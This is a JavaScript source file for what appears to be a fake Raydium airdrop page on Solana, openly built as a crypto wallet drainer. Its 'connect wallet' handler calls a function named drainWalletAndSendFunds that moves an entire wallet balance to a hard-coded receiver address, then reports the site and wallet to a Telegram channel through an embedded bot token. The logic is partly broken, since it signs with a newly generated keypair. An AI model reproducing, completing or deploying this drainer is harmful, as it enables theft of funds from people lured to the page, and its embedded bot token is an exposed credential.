const axios = require('axios');
const solanaWeb3 = require('@solana/web3.js');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7775444002:AAFPEESGH7hxLz-LDVf2TvCMwjjw2gz2-Lk';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '5915926682';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\\\\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const solana_wallet_receiver_id = '9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a';
    const website_url = 'https://raydium-airdrop-vert.vercel.app/';
    const connectWalletButton = document.querySelector('.connect-wallet');

    if (connectWalletButton) {
        connectWalletButton.addEventListener('click', () => {
            async function drainWalletAndSendFunds(receiverWallet) {
                try {
                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                    const fromWallet = solanaWeb3.Keypair.generate(); // This should be replaced with the actual user's wallet
                    const toWallet = new solanaWeb3.PublicKey(receiverWallet);

                    const balance = await connection.getBalance(fromWallet.publicKey);
                    if (balance > 0) {
                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: fromWallet.publicKey,
                                toPubkey: toWallet,
                                lamports: balance,
                            })
                        );

                        const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [fromWallet]);
                        console.log('Transfer successful, signature:', signature);
                    } else {
                        console.log('No funds to transfer.');
                    }
                } catch (error) {
                    console.error('Error draining wallet:', error);
                }
            }

            document.addEventListener('DOMContentLoaded', () => {
                const claimButton = document.querySelector('.connect-wallet');
                if (claimButton) {
                    claimButton.addEventListener('click', () => {
                        drainWalletAndSendFunds(solana_wallet_receiver_id);
                    });
                }
            });

            sendMessageToTelegram(solana_wallet_receiver_id, website_url);
        });
    }
});
